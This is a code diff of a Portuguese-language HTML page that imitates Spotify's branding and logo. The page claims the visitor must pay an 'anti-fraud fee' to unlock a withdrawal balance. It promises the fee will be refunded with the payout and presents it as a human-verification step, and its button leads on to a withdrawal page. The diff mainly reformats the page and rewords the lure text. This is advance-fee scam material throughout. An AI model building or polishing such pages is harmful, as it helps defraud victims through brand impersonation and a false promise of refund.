@@ -3,10 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Desbloquear Saldo</title>
+
     <!-- Alteração do ícone da página -->
     <link rel="icon" href="https://static.vecteezy.com/system/resources/previews/018/930/693/non_2x/spotify-app-logo-spotify-icon-transparent-free-png.png" type="image/png">
+
     <!-- Link para a biblioteca Font Awesome para ícones -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -14,12 +18,14 @@
             margin: 0;
             padding: 0;
         }
+
         header {
             background-color: #1DB954;
             color: white;
             text-align: center;
             padding: 20px;
         }
+
         .moldura-externa {
             max-width: 900px;
             margin: 50px auto;
@@ -29,21 +35,25 @@
             text-align: center;
             box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
         }
+
         .moldura-externa h1 {
             color: #333;
             font-size: 2.5em;
             margin-bottom: 20px;
         }
+
         .moldura-externa p {
             font-size: 1.2em;
             margin: 20px 0;
             color: #555;
         }
+
         .icone-cadeado {
             font-size: 5em; /* Ícone maior */
             color: #1DB954;
             margin-bottom: 20px;
         }
+
         .botao-desbloquear {
             background-color: #1DB954;
             color: white;
@@ -52,8 +62,9 @@
             border-radius: 25px;
             cursor: pointer;
             font-size: 1.3em;
-            transition: background-color 0.3s ease;
+            transition: background-color ease 0.3s;
         }
+
         .botao-desbloquear:hover {
             background-color: #1ed760;
         }
@@ -63,12 +74,15 @@
             .moldura-externa {
                 padding: 30px 20px;
             }
+
             .moldura-externa h1 {
                 font-size: 2em;
             }
+
             .icone-cadeado {
                 font-size: 4em;
             }
+
             .botao-desbloquear {
                 font-size: 1.1em;
                 padding: 14px 28px;
@@ -79,12 +93,15 @@
             .moldura-externa {
                 padding: 20px 15px;
             }
+
             .moldura-externa h1 {
                 font-size: 1.8em;
             }
+
             .icone-cadeado {
                 font-size: 4em;
             }
+
             .botao-desbloquear {
                 font-size: 1em;
                 padding: 12px 25px;
@@ -93,23 +110,19 @@
     </style>
 </head>
 <body>
+    <div class="moldura-externa">
+        <!-- Ícone de cadeado acima do título -->
+        <i class="fas fa-lock icone-cadeado"></i>
+        <h1>Desbloquear Seu Saldo</h1>
+        <p>Usamos uma taxa antifraude para evitar fraudes e abusos dos saques que existiam dentro do sistema. <br><br> Fique tranquilo, você receberá o valor da taxa de volta junto ao valor do seu saque. Esta é apenas uma etapa de validação para garantir que você é um humano e não um robô.</p>
+        <button class="botao-desbloquear" onclick="desbloquearSaldo()">Desbloquear Agora</button>
+    </div>
 
-<div class="moldura-externa">
-    <!-- Ícone de cadeado acima do título -->
-    <i class="fas fa-lock icone-cadeado"></i>
-    <h1>Desbloquear Seu Saldo</h1>
-    <p>Usamos uma taxa anti-fraudes, para evitar fraudes e abuso dos saques que estavam ocorrendo dentro do sistema. <br><br>
-    Fique tranquilo, você receberá o valor da taxa de volta junto ao valor do seu saque, e é apenas uma etapa de validação de que você é um humano e não um robô.</p>
-    
-    <button class="botao-desbloquear" onclick="desbloquearSaldo()">Desbloquear Agora</button>
-</div>
-
-<script>
-    function desbloquearSaldo() {
-        // Redirecionando o usuário para a nova interface 'saque_nova.html' sem exibir o alerta
-        window.location.href = "saque_nova.html"; // Substitua com a página de destino desejada
-    }
-</script>
-
+    <script>
+        function desbloquearSaldo() {
+            // Redirecionando o usuário para a nova interface 'saque_nova.html'
+            window.location.href = "saque_nova.html"; // Substitua pela página de destino desejada
+        }
+    </script>
 </body>
 </html>
